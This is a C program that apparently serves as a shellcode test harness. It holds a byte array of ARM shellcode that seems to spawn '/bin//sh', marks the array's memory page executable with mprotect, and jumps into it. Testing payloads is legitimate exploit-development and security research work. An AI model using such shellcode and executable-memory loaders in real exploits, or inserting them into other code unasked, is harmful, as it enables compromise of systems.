#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
    0x01, 0x70, 0x8f, 0xe2,
    0x17, 0xff, 0x2f, 0xe1,
    0x04, 0xa7, 0x03, 0xcf,
    0x52, 0x40, 0x07, 0xb4,
    0x68, 0x46, 0x05, 0xb4,
    0x69, 0x46, 0x0b, 0x27,
    0x01, 0xdf, 0x01, 0x01,
    0x2f, 0x62, 0x69, 0x6e,
    0x2f, 0x2f, 0x73, 0x68};

int main()
{
    printf("[*] Shellcode length: %zu bytes\n", sizeof(shellcode));

    long page_size = sysconf(_SC_PAGESIZE);
    void *addr = (void *)((size_t)shellcode & ~(page_size - 1));
    if (mprotect(addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect failed");
        return 1;
    }

    printf("[*] Executing shellcode...\n");
    ((void (*)(void))shellcode)();

    printf("[-] Shellcode execution failed or returned.\n");
    return 0;
}